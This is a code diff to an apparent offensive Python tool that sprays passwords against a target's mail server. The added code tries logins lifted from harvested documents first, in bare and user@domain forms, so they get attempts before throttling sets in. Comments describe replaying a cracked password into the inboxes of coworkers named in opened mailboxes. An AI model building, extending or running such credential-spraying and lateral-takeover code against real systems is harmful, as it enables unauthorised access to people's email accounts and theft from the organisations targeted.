@@ -109,6 +109,16 @@ def run(host: HostReport, opts) -> None:
                 if handle(result):
                     hits += 1
 
+    # Primary doc logins first, one at a time, so the most likely account gets a
+    # clean un-throttled attempt (both bare and user@domain forms).
+    primaries = list(dict.fromkeys(host.__dict__.get("primary_users", [])))
+    dom = _mail_domain(host)
+    prim_forms = []
+    for u in primaries:
+        prim_forms.append(u)
+        if dom and "@" not in u:
+            prim_forms.append(f"{u}@{dom}")
+    spray(prim_forms, 2)
     spray(confident, 4)
     # An opened mailbox names other employees (_harvest_correspondents adds them
     # to host.usernames) — replay the password into THOSE inboxes right away.
@@ -142,6 +152,24 @@ def run(host: HostReport, opts) -> None:
 
 
 # --------------------------------------------------------------------------
+def _mail_domain(host: HostReport) -> str:
+    """The mail domain for user@domain logins — from a harvested email, else the
+    registrable parent of a known mail/vhost name."""
+    for e in host.__dict__.get("emails", set()):
+        if "@" in e:
+            return e.split("@", 1)[1].lower()
+    for hn in host.hostnames:
+        labels = hn.split(".")
+        if len(labels) >= 2 and not _looks_ip(hn):
+            return ".".join(labels[-2:]).lower()
+    return ""
+
+
+def _looks_ip(name: str) -> bool:
+    p = name.split(".")
+    return len(p) == 4 and all(x.isdigit() for x in p)
+
+
 def _candidate_users(host: HostReport):
     """Two tiers so the valid login is always tried FIRST, before a long tail of
     guesses can throttle the mail server:
@@ -152,6 +180,9 @@ def _candidate_users(host: HostReport):
                   first-name list) that finds the NEXT employee's mailbox.
     """
     confident: List[str] = []
+    # explicit doc logins ("Username: kevin") first — the single most likely
+    # account, tried before any derived variant can throttle the server.
+    confident += list(host.__dict__.get("primary_users", []))
     emails: Set[str] = host.__dict__.get("emails", set())
     for e in emails:
         confident.append(e)                       # full address
